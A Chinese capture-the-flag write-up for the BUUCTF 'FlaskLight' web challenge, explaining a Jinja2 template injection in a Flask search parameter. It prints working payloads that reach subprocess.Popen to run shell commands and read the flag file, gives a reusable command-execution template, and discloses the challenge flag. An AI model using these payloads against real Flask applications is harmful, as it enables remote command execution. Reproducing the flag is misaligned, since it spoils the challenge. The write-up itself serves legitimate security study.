---
title: "[CSCCTF 2019 Qual]FlaskLight"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [flask, ssti, jinja2, python2, rce]
vulnerability: Jinja2 服务端模板注入 (SSTI) 导致远程代码执行
solved: true
flag: "flag{a32706a5-68b7-4c31-ba2d-be914ca8437c}"
---

# [CSCCTF 2019 Qual]FlaskLight

## 题目概述
题目是一个名为 Flasklight 的 Flask Web 应用，页面标题和 HTML 注释提示使用 GET 参数 `search` 进行查询。

## 信息收集
1. 访问首页，页面显示搜索功能和结果
2. HTML 注释泄露关键信息：`<!-- Parameter Name: search -->` 和 `<!-- Method: GET -->`
3. 测试 `?search={{7*7}}`，返回 `49`，确认存在 Jinja2 SSTI 漏洞

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：Jinja2 服务端模板注入 (SSTI)
- **原理**：Flask 使用 Jinja2 模板引擎，用户输入的 `search` 参数直接被渲染到模板中，未经过滤
- **判断过程**：
  1. `{{7*7}}` 返回 `49`，证明模板表达式被执行
  2. `{{''.__class__.__mro__}}` 返回 Python 类继承链，确认 Python 2 环境
  3. 通过 `__subclasses__()` 找到可利用的 `subprocess.Popen` 类（索引 258）

## 利用过程（Payload + Flag）

**步骤 1：确认 SSTI**
```
?search={{7*7}}  → 返回 49
```

**步骤 2：探索类继承链**
```python
# 获取 object 基类的所有子类
{{"".__class__.__mro__[2].__subclasses__()}}
```

**步骤 3：定位 subprocess.Popen**
```python
# 找到 subprocess.Popen 在索引 258
```

**步骤 4：RCE 读取 flag**
```python
# 列出根目录
{{"".__class__.__mro__[2].__subclasses__()[258]("ls /",shell=True,stdout=-1).communicate()[0]}}

# 列出 /flasklight 目录
{{"".__class__.__mro__[2].__subclasses__()[258]("ls -la /flasklight",shell=True,stdout=-1).communicate()[0]}}

# 读取 flag
{{"".__class__.__mro__[2].__subclasses__()[258]("cat /flasklight/coomme_geeeett_youur_flek",shell=True,stdout=-1).communicate()[0]}}
```

**Flag**: `flag{a32706a5-68b7-4c31-ba2d-be914ca8437c}`

## 复现步骤
1. 访问题目 URL
2. 构造 SSTI payload：`?search={{7*7}}` 验证漏洞
3. 利用 Python MRO 链找到 `subprocess.Popen` 类
4. 构造 RCE payload 执行系统命令
5. 在 `/flasklight/coomme_geeeett_youur_flek` 找到 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SSTI | GET 参数 search | `{{"".__class__.__mro__[2].__subclasses__()[258]("cmd",shell=True,stdout=-1).communicate()[0]}}` | Jinja2 模板注入、Python MRO、subprocess.Popen RCE |

## 知识总结（解题技巧、同类题型套路）
1. **SSTI 识别**：使用 `{{7*7}}` 等简单表达式测试
2. **Python 2 SSTI 利用链**：`''.__class__.__mro__[2].__subclasses__()` 获取所有子类
3. **常用 RCE 类**：`subprocess.Popen`、`os._wrap_close`、`commands` 等
4. **Python 2 vs 3**：Python 2 使用 `__mro__`，Python 3 使用 `__mro__` 或 `__bases__`
5. **同类题型**：Flask/Jinja2 SSTI 是 CTF 常见考点，掌握类继承链遍历和常用危险类的利用方式
